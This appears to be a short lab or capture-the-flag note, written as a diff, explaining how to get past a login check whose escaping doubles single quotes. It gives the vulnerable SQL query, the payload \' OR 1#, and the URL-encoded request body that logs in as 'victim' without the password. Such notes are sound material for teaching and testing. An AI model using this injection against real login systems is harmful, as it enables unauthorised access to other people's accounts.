@@ -1,0 +1,8 @@
+validateUser query: "SELECT id FROM users WHERE username='victim' AND password='input_pass';
+Now single quotes are replaced by 2 single quotes ' -> ''
+
+\' OR 1#
+
+\' turns into \'', which becomes '\'', so a string with the quote char and then we can OR and comment out the rest of the line
+
+username=victim&password=%5C%27%20OR%201%23
